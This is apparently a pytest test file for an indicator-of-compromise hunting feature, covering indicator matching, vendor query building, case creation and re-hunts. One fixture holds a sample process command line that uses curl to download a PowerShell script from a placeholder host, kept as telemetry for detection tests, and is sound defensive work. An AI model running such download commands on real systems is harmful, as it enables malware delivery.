# ruff: noqa: E501
"""The automatic IOC hunt: attribution, local + Trend + LogRhythm search, case creation (match / no match / partial), re-hunts."""

import json
from datetime import UTC, datetime, timedelta

import httpx
import pytest
from sqlalchemy import select, update

from app.auth.rbac import Role
from app.connectors import _http
from app.core.config import Settings, get_settings
from app.iochunt import hunting, runner
from app.iochunt.models import Ioc, IocHunt
from tests.helpers import ev
from tests.mitre_helpers import mitre_loaded  # noqa: F401

API = "/api/v1/ioc"
NOW = datetime.now(UTC)
C2 = "198.51.100.101"


async def _resolve(host, port):
    return ["93.184.216.34"]


@pytest.fixture
def wire(monkeypatch):
    def install(handler):
        monkeypatch.setattr(_http, "HTTP_TRANSPORT", httpx.MockTransport(handler))
        monkeypatch.setattr(_http, "RESOLVER", _resolve)

    async def nosleep(_):
        return None

    monkeypatch.setattr("app.connectors._http.asyncio.sleep", nosleep)
    monkeypatch.setattr("app.connectors.logrhythm._sleep", nosleep)
    return install


def doc(**kw):
    return {"id": "e" * 32, "timestamp": NOW.isoformat(), **kw}


def ioc(typ, value, **kw):
    return Ioc(type=typ, value=value, confidence=kw.pop("confidence", 70), first_seen=NOW, last_seen=NOW, **kw)


# ---- attribution ------------------------------------------------------------------------------------
def test_attribution_requires_the_exact_indicator():
    ip, dom, url, sha, mail = (
        ioc("ip", C2),
        ioc("domain", "evil.example"),
        ioc("url", "http://x.example/a.ps1"),
        ioc("sha256", "a" * 64),
        ioc("email", "bad@evil.example"),
    )
    d = doc(
        network={"dst_ip": C2},
        dns={"question": "evil.example"},
        process={"command_line": "curl http://x.example/a.ps1 -o a", "hash": {"sha256": "A" * 64}},
        message="from bad@evil.example",
    )
    got = {(i.type, f) for i, f in hunting.attribute(d, [ip, dom, url, sha, mail])}
    assert got == {
        ("ip", "network.dst_ip"),
        ("domain", "dns.question"),
        ("url", "text"),
        ("sha256", "process.hash.sha256"),
        ("email", "text"),
    }
    # a loose vendor query that returns a look-alike must not become a match
    near = doc(
        network={"dst_ip": "198.51.100.10"},
        dns={"question": "notevil.example"},
        process={"command_line": "ping evil.example.org.internal"},
    )
    assert hunting.attribute(near, [ip, dom]) == []
    assert hunting.attribute(doc(process={"command_line": "ping evil.example now"}), [dom])[0][1] == "text"
    assert hunting.attribute(doc(process={"command_line": "http://x.example/other"}), [url]) == []


def test_trend_queries_are_chunked_and_url_iocs_search_by_host():
    many = [ioc("ip", f"198.51.100.{n}") for n in range(1, 40)]
    qs = hunting._trend_queries("endpoint_activity", many)
    assert len(qs) >= 3 and all(len(q) <= 1000 and len(c) <= 12 for q, c in qs)
    assert sum(len(c) for _, c in qs) == 39 and 'dst:"198.51.100.1"' in qs[0][0]
    [(q, _)] = hunting._trend_queries("endpoint_activity", [ioc("url", "https://bad.example/p?a=b")])
    assert 'processCmd:"*bad.example*"' in q and "?a=b" not in q
    [(q, _)] = hunting._trend_queries("endpoint_activity", [ioc("domain", 'we"ird.example')])
    assert '\\"' in q
    assert (
        hunting._trend_queries("detections", [ioc("ip", C2)]) == []
    )  # no IP field on that dataset: skipped, not guessed
    assert hunting._trend_queries("alerts", many) == []


# ---- helpers ----------------------------------------------------------------------------------------
async def _admin(client, make):
    t = await make.tenant()
    user, h = await make.login_as(t, Role.TENANT_ADMIN)
    return t, user, h


async def _add(client, h, typ, value, **kw):
    r = await client.post(f"{API}/iocs", headers=h, json={"type": typ, "value": value, **kw})
    assert r.status_code == 201, r.text
    return r.json()


async def _validate(client, h, ids, **kw):
    r = await client.post(f"{API}/iocs/validate", headers=h, json={"ioc_ids": ids, **kw})
    assert r.status_code == 201, r.text
    return r.json()


async def _run(app):
    return await runner.process_pending(app.state.sessionmaker, app.state.search, get_settings())


async def _case(client, h, case_id):
    return (await client.get(f"/api/v1/cases/{case_id}", headers=h)).json()


# ---- end to end -------------------------------------------------------------------------------------
@pytest.mark.usefixtures("mitre_loaded")
async def test_validated_ioc_with_a_match_opens_a_fully_populated_case(client, make, app):
    t, user, h = await _admin(client, make)
    await make.index(
        t,
        [
            ev(
                20,
                event_type="network_connection",
                network={"dst_ip": C2, "dst_port": 443, "src_ip": "10.0.0.5"},
                host={"hostname": "WS-09", "ip": ["10.0.0.9"]},
                user={"name": "carol"},
            ),
            ev(
                15,
                event_type="network_connection",
                network={"dst_ip": C2, "dst_port": 443},
                host={"hostname": "SRV-02"},
            ),
            ev(
                10, event_type="network_connection", network={"dst_ip": "203.0.113.200"}, host={"hostname": "WS-01"}
            ),  # unrelated
        ],
    )
    a = await _add(client, h, "ip", C2, confidence=92, threat_type="botnet_cc", description="QakBot C2")
    b = await _add(client, h, "domain", "never-seen.example")
    hunt = await _validate(client, h, [a["id"], b["id"]], name="Wifak weekly IOCs")
    assert hunt["status"] == "PENDING" and hunt["ioc_count"] == 2 and "validated indicator(s)" in hunt["hypothesis"]
    assert await _run(app) == 1

    done = (await client.get(f"{API}/hunts/{hunt['id']}", headers=h)).json()
    assert done["status"] == "COMPLETED" and done["match_count"] == 2 and done["case_id"] and done["case_number"] == 1
    assert {m["host"] for m in done["matches"]} == {"WS-09", "SRV-02"} and all(
        m["ioc_value"] == C2 for m in done["matches"]
    )
    assert done["coverage"][0]["source"] == "Ingested telemetry" and done["coverage"][0]["hits"] == 2

    case = await _case(client, h, done["case_id"])
    assert case["status"] == "OPEN" and case["severity"] in ("HIGH", "CRITICAL") and case["priority"] in ("P1", "P2")
    assert (
        case["evidence_count"] == 2
        and case["ioc_count"] >= 2
        and case["asset_count"] >= 2
        and case["assignee"]["id"] == str(user.id)
    )
    d = case["description"]
    for section in (
        "## Verdict",
        "## Hypothesis",
        "## Scope: indicators",
        "## Data sources and coverage",
        "## Findings",
        "## Affected assets",
        "## MITRE ATT&CK",
        "## Recommendations",
    ):
        assert section in d, section
    assert "198[.]51[.]100[.]101" in d and C2 not in d  # indicators are defanged in prose
    assert "WS-09" in d and "SRV-02" in d and "never-seen[.]example" in d and "Contain" in d
    maps = (await client.get(f"/api/v1/mitre/mappings?object_type=case&object_id={done['case_id']}", headers=h)).json()
    assert any(m["technique_id"] == "T1071" and m["confidence"] == "MEDIUM" and m["evidence_event_ids"] for m in maps)
    # the platform hunt + a finding for the matched indicator exist and are linked
    hunt_rec = (await client.get(f"/api/v1/hunts/{case['hunt_id']}", headers=h)).json()
    assert hunt_rec["status"] == "COMPLETED" and hunt_rec["finding_count"] == 1
    # indicators moved on
    iocs = (await client.get(f"{API}/iocs?status=VALIDATED", headers=h)).json()["items"]
    assert len(iocs) == 2 and all(i["case_id"] == done["case_id"] and i["last_hunted_at"] for i in iocs)


@pytest.mark.usefixtures("mitre_loaded")
async def test_no_match_closes_the_case_with_the_coverage_as_resolution(client, make, app):
    t, _, h = await _admin(client, make)
    await make.index(t, [ev(5, event_type="network_connection", network={"dst_ip": "203.0.113.150"})])
    a = await _add(client, h, "ip", "198.51.100.102", threat_type="botnet_cc")
    hunt = await _validate(client, h, [a["id"]])
    await _run(app)
    done = (await client.get(f"{API}/hunts/{hunt['id']}", headers=h)).json()
    assert done["status"] == "COMPLETED" and done["match_count"] == 0
    case = await _case(client, h, done["case_id"])
    assert (
        case["status"] == "CLOSED"
        and "No evidence" in case["resolution"]
        and "Ingested telemetry" in case["resolution"]
    )
    assert (
        case["severity"] == "INFO"
        and "no event in the searched sources" in case["description"].lower()
        and "no action required" in case["description"].lower()
    )
    assert case["evidence_count"] == 0 and case["ioc_count"] == 1
    maps = (await client.get(f"/api/v1/mitre/mappings?object_type=case&object_id={done['case_id']}", headers=h)).json()
    assert maps and all(m["confidence"] == "LOW" for m in maps)  # declared by the feed only: never over-claimed


async def test_incomplete_coverage_never_closes_the_case(client, make, app, wire):
    t, _, h = await _admin(client, make)
    wire(lambda r: httpx.Response(401, json={"error": {"message": "no"}}))
    ds = await client.post(
        "/api/v1/data-sources",
        headers=h,
        json={
            "name": "tm",
            "connector_type": "trend_vision_one",
            "config": {"dataset": "endpoint_activity"},
            "secrets": {"api_key": "K"},
            "enabled": False,
        },
    )
    assert ds.status_code == 201
    a = await _add(client, h, "ip", "198.51.100.103")
    hunt = await _validate(client, h, [a["id"]])
    await _run(app)
    done = (await client.get(f"{API}/hunts/{hunt['id']}", headers=h)).json()
    assert done["status"] == "PARTIAL" and done["match_count"] == 0
    errs = [c for c in done["coverage"] if c["status"] == "error"]
    assert errs and "authentication rejected" in errs[0]["detail"] and errs[0]["detail"] != "K"
    case = await _case(client, h, done["case_id"])
    assert case["status"] == "OPEN" and "Coverage gaps" in case["description"] and "Inconclusive" in case["description"]
    # retry is only offered for failed/partial hunts
    assert (await client.post(f"{API}/hunts/{hunt['id']}/retry", headers=h)).json()["status"] == "PENDING"
    assert (await client.post(f"{API}/hunts/{hunt['id']}/retry", headers=h)).status_code == 409


async def test_total_failure_marks_the_hunt_failed_without_a_misleading_case(client, make, app, monkeypatch):
    t, _, h = await _admin(client, make)

    async def boom(*a, **k):
        raise RuntimeError("index down")

    monkeypatch.setattr(hunting, "search_local", boom)
    a = await _add(client, h, "ip", "198.51.100.104")
    hunt = await _validate(client, h, [a["id"]])
    await _run(app)
    done = (await client.get(f"{API}/hunts/{hunt['id']}", headers=h)).json()
    assert done["status"] == "FAILED" and done["case_id"] is None and "index down" in done["error"]
    assert (await client.get("/api/v1/cases", headers=h)).json() == [] or (
        await client.get("/api/v1/cases", headers=h)
    ).json()["items"] == []


# ---- upstream adapters ------------------------------------------------------------------------------
def trend_item(**kw):
    base = {
        "uuid": "u-1",
        "eventId": "3",
        "eventSubId": 204,
        "eventTimeDT": (NOW - timedelta(hours=2)).isoformat(),
        "endpointHostName": "WS-77",
        "endpointIp": ["10.7.7.7"],
        "src": "10.7.7.7",
        "dst": C2,
        "spt": 5000,
        "dpt": 443,
        "proto": "6",
        "processName": "evil.exe",
        "logonUser": ["CORP\\dave"],
    }
    return {**base, **kw}


async def test_trend_upstream_search_finds_events_in_a_source_that_is_not_ingested(client, make, app, wire):
    t, _, h = await _admin(client, make)
    seen = []

    def handler(request):
        seen.append(request)
        return httpx.Response(
            200,
            json={
                "items": [
                    trend_item(),
                    trend_item(uuid="u-2", dst="198.51.100.250"),
                    trend_item(uuid="u-3", eventId="1", objectName="a.exe", objectCmd="a.exe", dst=None),
                ],
                "progressRate": 100,
            },
        )

    wire(handler)
    # endpoint telemetry is NOT being ingested (disabled), yet remains searchable upstream
    ds = await client.post(
        "/api/v1/data-sources",
        headers=h,
        json={
            "name": "tm-ep",
            "connector_type": "trend_vision_one",
            "config": {"dataset": "endpoint_activity"},
            "secrets": {"api_key": "KEY-1"},
            "enabled": False,
        },
    )
    assert ds.status_code == 201
    a = await _add(client, h, "ip", C2, confidence=88, threat_type="botnet_cc")
    hunt = await _validate(client, h, [a["id"]], lookback_days=7)
    await _run(app)
    done = (await client.get(f"{API}/hunts/{hunt['id']}", headers=h)).json()
    assert done["status"] == "COMPLETED" and done["match_count"] == 1  # only the event that really contains the IOC
    cov = {c["kind"]: c for c in done["coverage"]}
    assert cov["trend:endpoint_activity"]["status"] == "ok" and cov["trend:endpoint_activity"]["hits"] == 1
    req = seen[0]
    assert (
        req.headers["authorization"] == "Bearer KEY-1"
        and f'dst:"{C2}"' in req.headers["tmv1-query"]
        and "startDateTime" in str(req.url)
    )
    case = await _case(client, h, done["case_id"])
    assert (
        case["evidence_count"] == 1 and "WS-77" in case["description"]
    )  # the upstream event was imported so it can be cited
    got = (
        await client.post(
            "/api/v1/events/search",
            headers=h,
            json={
                "text": "host.hostname:WS-77",
                "time_range": {
                    "start": (NOW - timedelta(days=1)).isoformat(),
                    "end": (NOW + timedelta(hours=1)).isoformat(),
                },
            },
        )
    ).json()
    assert got["total"] == 1


async def test_trend_unsupported_field_falls_back_clause_by_clause(client, make, app, wire):
    t, _, h = await _admin(client, make)
    queries = []

    def handler(request):
        q = request.headers["tmv1-query"]
        queries.append(q)
        if "objectIps" in q:
            return httpx.Response(
                400,
                json={
                    "error": {
                        "code": "BadRequest",
                        "message": "Unsupported query field. The specified query field does not exist.",
                    }
                },
            )
        return httpx.Response(200, json={"items": [trend_item()], "progressRate": 100})

    wire(handler)
    await client.post(
        "/api/v1/data-sources",
        headers=h,
        json={
            "name": "tm-ep",
            "connector_type": "trend_vision_one",
            "config": {"dataset": "endpoint_activity"},
            "secrets": {"api_key": "K"},
            "enabled": False,
        },
    )
    a = await _add(client, h, "ip", C2)
    hunt = await _validate(client, h, [a["id"]])
    await _run(app)
    done = (await client.get(f"{API}/hunts/{hunt['id']}", headers=h)).json()
    assert done["status"] == "COMPLETED" and done["match_count"] == 1
    assert any("objectIps" in q for q in queries) and any("objectIps" not in q for q in queries)


async def test_logrhythm_upstream_search_uses_console_captured_templates(client, make, app, wire, monkeypatch):
    t, _, h = await _admin(client, make)
    sent = []
    log = {
        "messageId": "m1",
        "logDate": int((NOW + timedelta(hours=1)).timestamp() * 1000),
        "classificationName": "Authentication Failure",
        "commonEventName": "User Logon Failure",
        "originIp": C2,
        "impactedHost": "dc1.corp.example",
        "login": "mallory",
        "priority": 40,
    }

    def handler(request):
        body = json.loads(request.content)
        if request.url.path.endswith("search-task"):
            sent.append(body["queryFilter"])
            return httpx.Response(200, json={"TaskId": "t1"})
        origin = body["data"]["paginator"]["origin"]
        return httpx.Response(200, json={"TaskStatus": "Completed", "Items": [log] if origin == 0 else []})

    wire(handler)
    tpl = {"msgFilterType": 2, "filterGroup": {"filterItems": [{"filterType": 38, "values": [{"value": "$IOC"}]}]}}
    r = await client.post(
        "/api/v1/data-sources",
        headers=h,
        json={
            "name": "lr",
            "connector_type": "logrhythm",
            "config": {"base_url": "https://lr.example", "hostname": "dc1", "ioc_filter_templates": {"ip": tpl}},
            "secrets": {"token": "T"},
            "enabled": False,
        },
    )
    assert r.status_code == 201, r.text
    a = await _add(client, h, "ip", C2)
    b = await _add(client, h, "domain", "no-template.example")
    hunt = await _validate(client, h, [a["id"], b["id"]])
    await _run(app)
    done = (await client.get(f"{API}/hunts/{hunt['id']}", headers=h)).json()
    cov = {c["kind"]: c for c in done["coverage"]}
    assert cov["logrhythm"]["status"] == "ok" and cov["logrhythm"]["iocs_searched"] == 1 and done["match_count"] == 1
    assert (
        sent and sent[0]["filterGroup"]["filterItems"][0]["values"][0]["value"] == C2
    )  # $IOC replaced, only for the typed template
    case = await _case(client, h, done["case_id"])
    assert case["evidence_count"] == 1 and "mallory" in case["description"]


async def test_logrhythm_without_templates_is_reported_as_a_coverage_note(client, make, app):
    t, _, h = await _admin(client, make)
    await client.post(
        "/api/v1/data-sources",
        headers=h,
        json={
            "name": "lr",
            "connector_type": "logrhythm",
            "config": {"base_url": "https://lr.example", "hostname": "dc1"},
            "secrets": {"token": "T"},
            "enabled": False,
        },
    )
    a = await _add(client, h, "ip", "198.51.100.105")
    hunt = await _validate(client, h, [a["id"]])
    await _run(app)
    done = (await client.get(f"{API}/hunts/{hunt['id']}", headers=h)).json()
    lr = next(c for c in done["coverage"] if c["kind"] == "logrhythm")
    assert lr["status"] == "skipped" and "ioc_filter_templates" in lr["detail"]
    assert done["status"] == "COMPLETED"  # a documented limitation is not a failure...
    case = await _case(client, h, done["case_id"])
    assert (
        case["status"] == "OPEN" and "Coverage gaps" in case["description"]
    )  # ...but it does keep the 'no evidence' verdict honest


# ---- watch list / re-hunt -----------------------------------------------------------------------------
@pytest.mark.usefixtures("mitre_loaded")
async def test_rehunt_reopens_a_closed_case_when_new_evidence_appears(client, make, app):
    t, _, h = await _admin(client, make)
    a = await _add(client, h, "ip", "198.51.100.106", confidence=80, threat_type="botnet_cc")
    hunt = await _validate(client, h, [a["id"]])
    await _run(app)
    first = (await client.get(f"{API}/hunts/{hunt['id']}", headers=h)).json()
    case_id = first["case_id"]
    assert (await _case(client, h, case_id))["status"] == "CLOSED"
    # the watch list is re-checked on a schedule, not before it is due
    assert await runner.schedule_rehunts(app.state.sessionmaker) == 0
    async with app.state.sessionmaker() as db:
        await db.execute(update(Ioc).where(Ioc.tenant_id == t.id).values(last_hunted_at=NOW - timedelta(hours=7)))
        await db.commit()
    assert await runner.schedule_rehunts(app.state.sessionmaker) == 1
    assert await runner.schedule_rehunts(app.state.sessionmaker) == 0  # not queued twice
    # nothing new: quiet, the case stays closed
    await _run(app)
    assert (await _case(client, h, case_id))["status"] == "CLOSED"
    # now the indicator shows up
    async with app.state.sessionmaker() as db:
        await db.execute(update(Ioc).where(Ioc.tenant_id == t.id).values(last_hunted_at=NOW - timedelta(hours=7)))
        await db.commit()
    await make.index(
        t,
        [
            ev(
                1,
                event_type="network_connection",
                network={"dst_ip": "198.51.100.106", "dst_port": 8080},
                host={"hostname": "WS-33"},
            )
        ],
    )
    assert await runner.schedule_rehunts(app.state.sessionmaker) == 1
    await _run(app)
    case = await _case(client, h, case_id)
    assert (
        case["status"] == "INVESTIGATING"
        and case["evidence_count"] == 1
        and case["severity"] in ("MEDIUM", "HIGH", "CRITICAL")
    )
    acts = [x["kind"] for x in (await client.get(f"/api/v1/cases/{case_id}/activity", headers=h)).json()]
    assert "status_change" in acts and "note" in acts
    hunts = (await client.get(f"{API}/hunts", headers=h)).json()
    assert [x["mode"] for x in hunts].count("rehunt") == 2 and hunts[0]["new_match_count"] == 1
    # the same event is never reported twice
    async with app.state.sessionmaker() as db:
        await db.execute(update(Ioc).where(Ioc.tenant_id == t.id).values(last_hunted_at=NOW - timedelta(hours=7)))
        await db.commit()
    await runner.schedule_rehunts(app.state.sessionmaker)
    await _run(app)
    assert (await client.get(f"{API}/hunts", headers=h)).json()[0]["new_match_count"] == 0


async def test_a_hunt_left_running_by_a_dead_worker_is_requeued(client, make, app):
    t, _, h = await _admin(client, make)
    a = await _add(client, h, "ip", "198.51.100.107")
    hunt = await _validate(client, h, [a["id"]])
    async with app.state.sessionmaker() as db:
        await db.execute(
            update(IocHunt)
            .where(IocHunt.id == __import__("uuid").UUID(hunt["id"]))
            .values(status="RUNNING", started_at=NOW - timedelta(hours=2))
        )
        await db.commit()
    assert (
        await runner.process_pending(app.state.sessionmaker, app.state.search, get_settings()) == 0
    )  # RUNNING is not claimed twice
    assert await runner.recover_stuck(app.state.sessionmaker) >= 1
    assert await _run(app) >= 1


async def test_validation_rules_and_isolation(client, make, app):
    t, _, h = await _admin(client, make)
    a = await _add(client, h, "ip", "198.51.100.108")
    async with app.state.sessionmaker() as db:
        db_ioc = (await db.execute(select(Ioc).where(Ioc.tenant_id == t.id))).scalar_one()
        db_ioc.status = "EXPIRED"
        await db.commit()
    r = await client.post(f"{API}/iocs/validate", headers=h, json={"ioc_ids": [a["id"]]})
    assert r.status_code == 409 and "expired" in r.json()["error"]["message"]
    for bad in ({"ioc_ids": []}, {"ioc_ids": [a["id"]], "lookback_days": 99}, {"ioc_ids": ["x"]}):
        assert (await client.post(f"{API}/iocs/validate", headers=h, json=bad)).status_code == 422
    assert (
        await client.post(f"{API}/iocs/reject", headers=h, json={"ioc_ids": [a["id"]], "reason": "noise"})
    ).json() == {"rejected": 1}
    ov = (await client.get(f"{API}/overview", headers=h)).json()
    assert ov["iocs_by_status"] == {"REJECTED": 1} and ov["hunts_by_status"] == {}
    _, hb = await make.login_as(await make.tenant(), Role.TENANT_ADMIN)
    assert (await client.get(f"{API}/hunts", headers=hb)).json() == []
    _ = Settings
